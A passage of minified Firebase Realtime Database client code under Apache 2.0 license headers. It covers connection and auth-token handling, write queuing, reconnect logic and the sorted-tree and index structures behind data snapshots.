e=this.authToken_,n=C_(e)?"auth":"gauth",r={cred:e};this.authOverride_===null?r.noauth=!0:typeof this.authOverride_=="object"&&(r.authvar=this.authOverride_),this.sendRequest(n,r,s=>{const o=s.s,a=s.d||"error";this.authToken_===e&&(o==="ok"?this.invalidAuthTokenCount_=0:this.onAuthRevoked_(o,a))})}}tryAppCheck(){this.connected_&&this.appCheckToken_&&this.sendRequest("appcheck",{token:this.appCheckToken_},e=>{const n=e.s,r=e.d||"error";n==="ok"?this.invalidAppCheckTokenCount_=0:this.onAppCheckRevoked_(n,r)})}unlisten(e,n){const r=e._path.toString(),s=e._queryIdentifier;this.log_("Unlisten called for "+r+" "+s),$(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"unlisten() called for non-default but complete query"),this.removeListen_(r,s)&&this.connected_&&this.sendUnlisten_(r,s,e._queryObject,n)}sendUnlisten_(e,n,r,s){this.log_("Unlisten on "+e+" for "+n);const o={p:e},a="n";s&&(o.q=r,o.t=s),this.sendRequest(a,o)}onDisconnectPut(e,n,r){this.initConnection_(),this.connected_?this.sendOnDisconnect_("o",e,n,r):this.onDisconnectRequestQueue_.push({pathString:e,action:"o",data:n,onComplete:r})}onDisconnectMerge(e,n,r){this.initConnection_(),this.connected_?this.sendOnDisconnect_("om",e,n,r):this.onDisconnectRequestQueue_.push({pathString:e,action:"om",data:n,onComplete:r})}onDisconnectCancel(e,n){this.initConnection_(),this.connected_?this.sendOnDisconnect_("oc",e,null,n):this.onDisconnectRequestQueue_.push({pathString:e,action:"oc",data:null,onComplete:n})}sendOnDisconnect_(e,n,r,s){const o={p:n,d:r};this.log_("onDisconnect "+e,o),this.sendRequest(e,o,a=>{s&&setTimeout(()=>{s(a.s,a.d)},Math.floor(0))})}put(e,n,r,s){this.putInternal("p",e,n,r,s)}merge(e,n,r,s){this.putInternal("m",e,n,r,s)}putInternal(e,n,r,s,o){this.initConnection_();const a={p:n,d:r};o!==void 0&&(a.h=o),this.outstandingPuts_.push({action:e,request:a,onComplete:s}),this.outstandingPutCount_++;const l=this.outstandingPuts_.length-1;this.connected_?this.sendPut_(l):this.log_("Buffering put: "+n)}sendPut_(e){const n=this.outstandingPuts_[e].action,r=this.outstandingPuts_[e].request,s=this.outstandingPuts_[e].onComplete;this.outstandingPuts_[e].queued=this.connected_,this.sendRequest(n,r,o=>{this.log_(n+" response",o),delete this.outstandingPuts_[e],this.outstandingPutCount_--,this.outstandingPutCount_===0&&(this.outstandingPuts_=[]),s&&s(o.s,o.d)})}reportStats(e){if(this.connected_){const n={c:e};this.log_("reportStats",n),this.sendRequest("s",n,r=>{if(r.s!=="ok"){const o=r.d;this.log_("reportStats","Error sending stats: "+o)}})}}onDataMessage_(e){if("r"in e){this.log_("from server: "+Ue(e));const n=e.r,r=this.requestCBHash_[n];r&&(delete this.requestCBHash_[n],r(e.b))}else{if("error"in e)throw"A server-side error has occurred: "+e.error;"a"in e&&this.onDataPush_(e.a,e.b)}}onDataPush_(e,n){this.log_("handleServerMessage",e,n),e==="d"?this.onDataUpdate_(n.p,n.d,!1,n.t):e==="m"?this.onDataUpdate_(n.p,n.d,!0,n.t):e==="c"?this.onListenRevoked_(n.p,n.q):e==="ac"?this.onAuthRevoked_(n.s,n.d):e==="apc"?this.onAppCheckRevoked_(n.s,n.d):e==="sd"?this.onSecurityDebugPacket_(n):wd("Unrecognized action received from server: "+Ue(e)+`
Are you using the latest client?`)}onReady_(e,n){this.log_("connection ready"),this.connected_=!0,this.lastConnectionEstablishedTime_=new Date().getTime(),this.handleTimestamp_(e),this.lastSessionId=n,this.firstConnection_&&this.sendConnectStats_(),this.restoreState_(),this.firstConnection_=!1,this.onConnectStatus_(!0)}scheduleConnect_(e){$(!this.realtime_,"Scheduling a connect when we're already connected/ing?"),this.establishConnectionTimer_&&clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=setTimeout(()=>{this.establishConnectionTimer_=null,this.establishConnection_()},Math.floor(e))}initConnection_(){!this.realtime_&&this.firstConnection_&&this.scheduleConnect_(0)}onVisible_(e){e&&!this.visible_&&this.reconnectDelay_===this.maxReconnectDelay_&&(this.log_("Window became visible.  Reducing delay."),this.reconnectDelay_=ci,this.realtime_||this.scheduleConnect_(0)),this.visible_=e}onOnline_(e){e?(this.log_("Browser went online."),this.reconnectDelay_=ci,this.realtime_||this.scheduleConnect_(0)):(this.log_("Browser went offline.  Killing connection."),this.realtime_&&this.realtime_.close())}onRealtimeDisconnect_(){if(this.log_("data client disconnected"),this.connected_=!1,this.realtime_=null,this.cancelSentTransactions_(),this.requestCBHash_={},this.shouldReconnect_()){this.visible_?this.lastConnectionEstablishedTime_&&(new Date().getTime()-this.lastConnectionEstablishedTime_>MS&&(this.reconnectDelay_=ci),this.lastConnectionEstablishedTime_=null):(this.log_("Window isn't visible.  Delaying reconnect."),this.reconnectDelay_=this.maxReconnectDelay_,this.lastConnectionAttemptTime_=new Date().getTime());const e=new Date().getTime()-this.lastConnectionAttemptTime_;let n=Math.max(0,this.reconnectDelay_-e);n=Math.random()*n,this.log_("Trying to reconnect in "+n+"ms"),this.scheduleConnect_(n),this.reconnectDelay_=Math.min(this.maxReconnectDelay_,this.reconnectDelay_*zS)}this.onConnectStatus_(!1)}async establishConnection_(){if(this.shouldReconnect_()){this.log_("Making a connection attempt"),this.lastConnectionAttemptTime_=new Date().getTime(),this.lastConnectionEstablishedTime_=null;const e=this.onDataMessage_.bind(this),n=this.onReady_.bind(this),r=this.onRealtimeDisconnect_.bind(this),s=this.id+":"+In.nextConnectionId_++,o=this.lastSessionId;let a=!1,l=null;const c=function(){l?l.close():(a=!0,r())},d=function(f){$(l,"sendRequest call when we're not connected not allowed."),l.sendRequest(f)};this.realtime_={close:c,sendRequest:d};const p=this.forceTokenRefresh_;this.forceTokenRefresh_=!1;try{const[f,u]=await Promise.all([this.authTokenProvider_.getToken(p),this.appCheckTokenProvider_.getToken(p)]);a?Ze("getToken() completed but was canceled"):(Ze("getToken() completed. Creating connection."),this.authToken_=f&&f.accessToken,this.appCheckToken_=u&&u.token,l=new IS(s,this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,e,n,r,b=>{ft(b+" ("+this.repoInfo_.toString()+")"),this.interrupt(OS)},o))}catch(f){this.log_("Failed to get token: "+f),a||(this.repoInfo_.nodeAdmin&&ft(f),c())}}}interrupt(e){Ze("Interrupting connection for reason: "+e),this.interruptReasons_[e]=!0,this.realtime_?this.realtime_.close():(this.establishConnectionTimer_&&(clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=null),this.connected_&&this.onRealtimeDisconnect_())}resume(e){Ze("Resuming connection for reason: "+e),delete this.interruptReasons_[e],Wf(this.interruptReasons_)&&(this.reconnectDelay_=ci,this.realtime_||this.scheduleConnect_(0))}handleTimestamp_(e){const n=e-new Date().getTime();this.onServerInfoUpdate_({serverTimeOffset:n})}cancelSentTransactions_(){for(let e=0;e<this.outstandingPuts_.length;e++){const n=this.outstandingPuts_[e];n&&"h"in n.request&&n.queued&&(n.onComplete&&n.onComplete("disconnect"),delete this.outstandingPuts_[e],this.outstandingPutCount_--)}this.outstandingPutCount_===0&&(this.outstandingPuts_=[])}onListenRevoked_(e,n){let r;n?r=n.map(o=>$u(o)).join("$"):r="default";const s=this.removeListen_(e,r);s&&s.onComplete&&s.onComplete("permission_denied")}removeListen_(e,n){const r=new he(e).toString();let s;if(this.listens.has(r)){const o=this.listens.get(r);s=o.get(n),o.delete(n),o.size===0&&this.listens.delete(r)}else s=void 0;return s}onAuthRevoked_(e,n){Ze("Auth token revoked: "+e+"/"+n),this.authToken_=null,this.forceTokenRefresh_=!0,this.realtime_.close(),(e==="invalid_token"||e==="permission_denied")&&(this.invalidAuthTokenCount_++,this.invalidAuthTokenCount_>=uh&&(this.reconnectDelay_=dh,this.authTokenProvider_.notifyForInvalidToken()))}onAppCheckRevoked_(e,n){Ze("App check token revoked: "+e+"/"+n),this.appCheckToken_=null,this.forceTokenRefresh_=!0,(e==="invalid_token"||e==="permission_denied")&&(this.invalidAppCheckTokenCount_++,this.invalidAppCheckTokenCount_>=uh&&this.appCheckTokenProvider_.notifyForInvalidToken())}onSecurityDebugPacket_(e){this.securityDebugCallback_?this.securityDebugCallback_(e):"msg"in e&&console.log("FIREBASE: "+e.msg.replace(`
`,`
FIREBASE: `))}restoreState_(){this.tryAuth(),this.tryAppCheck();for(const e of this.listens.values())for(const n of e.values())this.sendListen_(n);for(let e=0;e<this.outstandingPuts_.length;e++)this.outstandingPuts_[e]&&this.sendPut_(e);for(;this.onDisconnectRequestQueue_.length;){const e=this.onDisconnectRequestQueue_.shift();this.sendOnDisconnect_(e.action,e.pathString,e.data,e.onComplete)}for(let e=0;e<this.outstandingGets_.length;e++)this.outstandingGets_[e]&&this.sendGet_(e)}sendConnectStats_(){const e={};let n="js";e["sdk."+n+"."+Ix.replace(/\./g,"-")]=1,bx()?e["framework.cordova"]=1:x_()&&(e["framework.reactnative"]=1),this.reportStats(e)}shouldReconnect_(){const e=Fa.getInstance().currentlyOnline();return Wf(this.interruptReasons_)&&e}}In.nextPersistentConnectionId_=0;In.nextConnectionId_=0;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class se{constructor(e,n){this.name=e,this.node=n}static Wrap(e,n){return new se(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yl{getCompare(){return this.compare.bind(this)}indexedValueChanged(e,n){const r=new se(Is,e),s=new se(Is,n);return this.compare(r,s)!==0}minPost(){return se.MIN}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Vo;class ev extends yl{static get __EMPTY_NODE(){return Vo}static set __EMPTY_NODE(e){Vo=e}compare(e,n){return Br(e.name,n.name)}isDefinedOn(e){throw Ws("KeyIndex.isDefinedOn not expected to be called.")}indexedValueChanged(e,n){return!1}minPost(){return se.MIN}maxPost(){return new se(zr,Vo)}makePost(e,n){return $(typeof e=="string","KeyIndex indexValue must always be a string."),new se(e,Vo)}toString(){return".key"}}const bs=new ev;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Go{constructor(e,n,r,s,o=null){this.isReverse_=s,this.resultGenerator_=o,this.nodeStack_=[];let a=1;for(;!e.isEmpty();)if(e=e,a=n?r(e.key,n):1,s&&(a*=-1),a<0)this.isReverse_?e=e.left:e=e.right;else if(a===0){this.nodeStack_.push(e);break}else this.nodeStack_.push(e),this.isReverse_?e=e.right:e=e.left}getNext(){if(this.nodeStack_.length===0)return null;let e=this.nodeStack_.pop(),n;if(this.resultGenerator_?n=this.resultGenerator_(e.key,e.value):n={key:e.key,value:e.value},this.isReverse_)for(e=e.left;!e.isEmpty();)this.nodeStack_.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack_.push(e),e=e.left;return n}hasNext(){return this.nodeStack_.length>0}peek(){if(this.nodeStack_.length===0)return null;const e=this.nodeStack_[this.nodeStack_.length-1];return this.resultGenerator_?this.resultGenerator_(e.key,e.value):{key:e.key,value:e.value}}}class Ke{constructor(e,n,r,s,o){this.key=e,this.value=n,this.color=r??Ke.RED,this.left=s??wt.EMPTY_NODE,this.right=o??wt.EMPTY_NODE}copy(e,n,r,s,o){return new Ke(e??this.key,n??this.value,r??this.color,s??this.left,o??this.right)}count(){return this.left.count()+1+this.right.count()}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||!!e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min_(){return this.left.isEmpty()?this:this.left.min_()}minKey(){return this.min_().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,n,r){let s=this;const o=r(e,s.key);return o<0?s=s.copy(null,null,null,s.left.insert(e,n,r),null):o===0?s=s.copy(null,n,null,null,null):s=s.copy(null,null,null,null,s.right.insert(e,n,r)),s.fixUp_()}removeMin_(){if(this.left.isEmpty())return wt.EMPTY_NODE;let e=this;return!e.left.isRed_()&&!e.left.left.isRed_()&&(e=e.moveRedLeft_()),e=e.copy(null,null,null,e.left.removeMin_(),null),e.fixUp_()}remove(e,n){let r,s;if(r=this,n(e,r.key)<0)!r.left.isEmpty()&&!r.left.isRed_()&&!r.left.left.isRed_()&&(r=r.moveRedLeft_()),r=r.copy(null,null,null,r.left.remove(e,n),null);else{if(r.left.isRed_()&&(r=r.rotateRight_()),!r.right.isEmpty()&&!r.right.isRed_()&&!r.right.left.isRed_()&&(r=r.moveRedRight_()),n(e,r.key)===0){if(r.right.isEmpty())return wt.EMPTY_NODE;s=r.right.min_(),r=r.copy(s.key,s.value,null,null,r.right.removeMin_())}r=r.copy(null,null,null,null,r.right.remove(e,n))}return r.fixUp_()}isRed_(){return this.color}fixUp_(){let e=this;return e.right.isRed_()&&!e.left.isRed_()&&(e=e.rotateLeft_()),e.left.isRed_()&&e.left.left.isRed_()&&(e=e.rotateRight_()),e.left.isRed_()&&e.right.isRed_()&&(e=e.colorFlip_()),e}moveRedLeft_(){let e=this.colorFlip_();return e.right.left.isRed_()&&(e=e.copy(null,null,null,null,e.right.rotateRight_()),e=e.rotateLeft_(),e=e.colorFlip_()),e}moveRedRight_(){let e=this.colorFlip_();return e.left.left.isRed_()&&(e=e.rotateRight_(),e=e.colorFlip_()),e}rotateLeft_(){const e=this.copy(null,null,Ke.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight_(){const e=this.copy(null,null,Ke.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip_(){const e=this.left.copy(null,null,!this.left.color,null,null),n=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,n)}checkMaxDepth_(){const e=this.check_();return Math.pow(2,e)<=this.count()+1}check_(){if(this.isRed_()&&this.left.isRed_())throw new Error("Red node has red child("+this.key+","+this.value+")");if(this.right.isRed_())throw new Error("Right child of ("+this.key+","+this.value+") is red");const e=this.left.check_();if(e!==this.right.check_())throw new Error("Black depths differ");return e+(this.isRed_()?0:1)}}Ke.RED=!0;Ke.BLACK=!1;class FS{copy(e,n,r,s,o){return this}insert(e,n,r){return new Ke(e,n,null)}remove(e,n){return this}count(){return 0}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}check_(){return 0}isRed_(){return!1}}class wt{constructor(e,n=wt.EMPTY_NODE){this.comparator_=e,this.root_=n}insert(e,n){return new wt(this.comparator_,this.root_.insert(e,n,this.comparator_).copy(null,null,Ke.BLACK,null,null))}remove(e){return new wt(this.comparator_,this.root_.remove(e,this.comparator_).copy(null,null,Ke.BLACK,null,null))}get(e){let n,r=this.root_;for(;!r.isEmpty();){if(n=this.comparator_(e,r.key),n===0)return r.value;n<0?r=r.left:n>0&&(r=r.right)}return null}getPredecessorKey(e){let n,r=this.root_,s=null;for(;!r.isEmpty();)if(n=this.comparator_(e,r.key),n===0){if(r.left.isEmpty())return s?s.key:null;for(r=r.left;!r.right.isEmpty();)r=r.right;return r.key}else n<0?r=r.left:n>0&&(s=r,r=r.right);throw new Error("Attempted to find predecessor key for a nonexistent key.  What gives?")}isEmpty(){return this.root_.isEmpty()}count(){return this.root_.count()}minKey(){return this.root_.minKey()}maxKey(){return this.root_.maxKey()}inorderTraversal(e){return this.root_.inorderTraversal(e)}reverseTraversal(e){return this.root_.reverseTraversal(e)}getIterator(e){return new Go(this.root_,null,this.comparator_,!1,e)}getIteratorFrom(e,n){return new Go(this.root_,e,this.comparator_,!1,n)}getReverseIteratorFrom(e,n){return new Go(this.root_,e,this.comparator_,!0,n)}getReverseIterator(e){return new Go(this.root_,null,this.comparator_,!0,e)}}wt.EMPTY_NODE=new FS;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function WS(t,e){return Br(t.name,e.name)}function Ku(t,e){return Br(t,e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Cd;function $S(t){Cd=t}const tv=function(t){return typeof t=="number"?"number:"+Px(t):"string:"+t},nv=function(t){if(t.isLeafNode()){const e=t.val();$(typeof e=="string"||typeof e=="number"||typeof e=="object"&&gn(e,".sv"),"Priority must be a string or number.")}else $(t===Cd||t.isEmpty(),"priority of unexpected type.");$(t===Cd||t.getPriority().isEmpty(),"Priority nodes can't have a priority of their own.")};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let ph;class Ge{constructor(e,n=Ge.__childrenNodeConstructor.EMPTY_NODE){this.value_=e,this.priorityNode_=n,this.lazyHash_=null,$(this.value_!==void 0&&this.value_!==null,"LeafNode shouldn't be created with null/undefined value."),nv(this.priorityNode_)}static set __childrenNodeConstructor(e){ph=e}static get __childrenNodeConstructor(){return ph}isLeafNode(){return!0}getPriority(){return this.priorityNode_}updatePriority(e){return new Ge(this.value_,e)}getImmediateChild(e){return e===".priority"?this.priorityNode_:Ge.__childrenNodeConstructor.EMPTY_NODE}getChild(e){return ie(e)?this:re(e)===".priority"?this.priorityNode_:Ge.__childrenNodeConstructor.EMPTY_NODE}hasChild(){return!1}getPredecessorChildName(e,n){return null}updateImmediateChild(e,n){return e===".priority"?this.updatePriority(n):n.isEmpty()&&e!==".priority"?this:Ge.__childrenNodeConstructor.EMPTY_NODE.updateImmediateChild(e,n).updatePriority(this.priorityNode_)}updateChild(e,n){const r=re(e);return r===null?n:n.isEmpty()&&r!==".priority"?this:($(r!==".priority"||cr(e)===1,".priority must be the last token in a path"),this.updateImmediateChild(r,Ge.__childrenNodeConstructor.EMPTY_NODE.updateChild(ve(e),n)))}isEmpty(){return!1}numChildren(){return 0}forEachChild(e,n){return!1}val(e){return e&&!this.getPriority().isEmpty()?{".value":this.getValue(),".priority":this.getPriority().val()}:this.getValue()}hash(){if(this.lazyHash_===null){let e="";this.priorityNode_.isEmpty()||(e+="priority:"+tv(this.priorityNode_.val())+":");const n=typeof this.value_;e+=n+":",n==="number"?e+=Px(this.value_):e+=this.value_,this.lazyHash_=Tx(e)}return this.lazyHash_}getValue(){return this.value_}compareTo(e){return e===Ge.__childrenNodeConstructor.EMPTY_NODE?1:e instanceof Ge.__childrenNodeConstructor?-1:($(e.isLeafNode(),"Unknown node type"),this.compareToLeafNode_(e))}compareToLeafNode_(e){const n=typeof e.value_,r=typeof this.value_,s=Ge.VALUE_TYPE_ORDER.indexOf(n),o=Ge.VALUE_TYPE_ORDER.indexOf(r);return $(s>=0,"Unknown leaf type: "+n),$(o>=0,"Unknown leaf type: "+r),s===o?r==="object"?0:this.value_<e.value_?-1:this.value_===e.value_?0:1:o-s}withIndex(){return this}isIndexed(){return!0}equals(e){if(e===this)return!0;if(e.isLeafNode()){const n=e;return this.value_===n.value_&&this.priorityNode_.equals(n.priorityNode_)}else return!1}}Ge.VALUE_TYPE_ORDER=["object","boolean","number","string"];/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let rv,sv;function BS(t){rv=t}function US(t){sv=t}class HS extends yl{compare(e,n){const r=e.node.getPriority(),s=n.node.getPriority(),o=r.compareTo(s);return o===0?Br(e.name,n.name):o}isDefinedOn(e){return!e.getPriority().isEmpty()}indexedValueChanged(e,n){return!e.getPriority().equals(n.getPriority())}minPost(){return se.MIN}maxPost(){return new se(zr,new Ge("[PRIORITY-POST]",sv))}makePost(e,n){const r=rv(e);return new se(n,new Ge("[PRIORITY-POST]",r))}toString(){return".priority"}}const Ae=new HS;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const VS=Math.log(2);class GS{constructor(e){const n=o=>parseInt(Math.log(o)/VS,10),r=o=>parseInt(Array(o+1).join("1"),2);this.count=n(e+1),this.current_=this.count-1;const s=r(this.count);this.bits_=e+1&s}nextBitIsOne(){const e=!(this.bits_&1<<this.current_);return this.current_--,e}}const Wa=function(t,e,n,r){t.sort(e);const s=function(c,d){const p=d-c;let f,u;if(p===0)return null;if(p===1)return f=t[c],u=n?n(f):f,new Ke(u,f.node,Ke.BLACK,null,null);{const b=parseInt(p/2,10)+c,x=s(c,b),v=s(b+1,d);return f=t[b],u=n?n(f):f,new Ke(u,f.node,Ke.BLACK,x,v)}},o=function(c){let d=null,p=null,f=t.length;const u=function(x,v){const _=f-x,m=f;f-=x;const h=s(_+1,m),y=t[_],w=n?n(y):y;b(new Ke(w,y.node,v,null,h))},b=function(x){d?(d.left=x,d=x):(p=x,d=x)};for(let x=0;x<c.count;++x){const v=c.nextBitIsOne(),_=Math.pow(2,c.count-(x+1));v?u(_,Ke.BLACK):(u(_,Ke.BLACK),u(_,Ke.RED))}return p},a=new GS(t.length),l=o(a);return new wt(r||e,l)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let mc;const Jr={};class Nn{constructor(e,n){this.indexes_=e,this.indexSet_=n}static get Default(){return $(Jr&&Ae,"ChildrenNode.ts has not been loaded"),mc=mc||new Nn({".priority":Jr},{".priority":Ae}),mc}get(e){const n=Es(this.indexes_,e);if(!n)throw new Error("No index defined for "+e);return n instanceof wt?n:null}hasIndex(e){return gn(this.indexSet_,e.toString())}addIndex(e,n){$(e!==bs,"KeyIndex always exists and isn't meant to be added to the IndexMap.");const r=[];let s=!1;const o=n.getIterator(se.Wrap);let a=o.getNext();for(;a;)s=s||e.isDefinedOn(a.node),r.push(a),a=o.getNext();let l;s?l=Wa(r,e.getCompare()):l=Jr;const c=e.toString(),d=Object.assign({},this.indexSet_);d[c]=e;const p=Object.assign({},this.indexes_);return p[c]=l,new Nn(p,d)}addToIndexes(e,n){const r=La(this.indexes_,(s,o)=>{const a=Es(this.indexSet_,o);if($(a,"Missing index implementation for "+o),s===Jr)if(a.isDefinedOn(e.node)){const l=[],c=n.getIterator(se.Wrap);let d=c.getNext();for(;d;)d.name!==e.name&&l.push(d),d=c.getNext();return l.push(e),Wa(l,a.getCompare())}else return Jr;else{const l=n.get(e.name);let c=s;return l&&(c=c.remove(new se(e.name,l))),c.insert(e,e.node)}});return new Nn(r,this.indexSet_)}removeFromIndexes(e,n){const r=La(this.indexes_,s=>{if(s===Jr)return s;{const o=n.get(e.name);return o?s.remove(new se(e.name,o)):s}});return new Nn(r,this.indexSet_)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let di;class J{constructor(e,n,r){this.children_=e,this.priorityNode_=n,this.indexMap_=r,this.lazyHash_=null,this.priorityNode_&&nv(this.priorityNode_),this.children_.isEmpty()&&$(!this.priorityNode_||this.priorityNode_.isEmpty(),"An empty node cannot have a priority")}static get EMPTY_NODE(){return di||(di=new J(new wt(Ku),null,Nn.Default))}isLeafNode(){return!1}getPriority(){return this.priorityNode_||di}updatePriority(e){return this.children_.isEmpty()?this:new J(this.children_,e,this.indexMap_)}getImmediateChild(e){if(e===".priority")return this.getPriority();{const n=this.children_.get(e);return n===null?di:n}}getChild(e){const n=re(e);return n===null?this:this.getImmediateChild(n).getChild(ve(e))}hasChild(e){return this.children_.get(e)!==null}updateImmediateChild(e,n){if($(n,"We should always be passing snapshot nodes"),e===".priority")return this.updatePriority(n);{const r=new se(e,n);let s,o;n.isEmpty()?(s=this.children_.remove(e),o=this.indexMap_.removeFromIndexes(r,this.children_)):(s=this.children_.insert(e,n),o=this.indexMap_.addToIndexes(r,this.children_));const a=s.isEmpty()?di:this.priorityNode_;return new J(s,a,o)}}updateChild(e,n){const r=re(e);if(r===null)return n;{$(re(e)!==".priority"||cr(e)===1,".priority must be the last token in a path");const s=this.getImmediateChild(r).updateChild(ve(e),n);return this.updateImmediateChild(r,s)}}isEmpty(){return this.children_.isEmpty()}numChildren(){return this.children_.count()}val(e){if(this.isEmpty())return null;const n={};let r=0,s=0,o=!0;if(this.forEachChild(Ae,(a,l)=>{n[a]=l.val(e),r++,o&&J.INTEGER_REGEXP_.test(a)?s=Math.max(s,Number(a)):o=!1}),!e&&o&&s<2*r){const a=[];for(const l in n)a[l]=n[l];return a}else return e&&!this.getPriority().isEmpty()&&(n[".priority"]=this.getPriority().val()),n}hash(){if(this.lazyHash_===null){let e="";this.getPriority().isEmpty()||(e+="priority:"+tv(this.getPriority().val())+":"),this.forEachChild(Ae,(n,r)=>{const s=r.hash();s!==""&&(e+=":"+n+":"+s)}),this.lazyHash_=e===""?"":Tx(e)}return this.lazyHash_}getPredecessorChildName(e,n,r){const s=this.resolveIndex_(r);if(s){const o=s.getPredecessorKey(new se(e,n));return o?o.name:null}else return this.children_.getPredecessorKey(e)}getFirstChildName(e){const n=this.resolveIndex_(e);if(n){const r=n.minKey();return r&&r.name}else return this.children_.minKey()}getFirstChild(e){const n=this.getFirstChildName(e);return n?new se(n,this.children_.get(n)):null}getLastChildName(e){const n=this.resolveIndex_(e);if(n){const r=n.maxKey();return r&&r.name}else return this.children_.maxKey()}getLastChild(e){const n=this.getLastChildName(e);return n?new se(n,this.children_.get(n)):null}forEachChild(e,n){const r=this.resolveIndex_(e);return r?r.inorderTraversal(s=>n(s.name,s.node)):this.children_.inorderTraversal(n)}getIterator(e){return this.getIteratorFrom(e.minPost(),e)}getIteratorFrom(e,n){const r=this.resolveIndex_(n);if(r)return r.getIteratorFrom(e,s=>s);{const s=this.children_.getIteratorFrom(e.name,se.Wrap);let o=s.peek();for(;o!=null&&n.compare(o,e)<0;)s.getNext(),o=s.peek();return s}}getReverseIterator(e){return 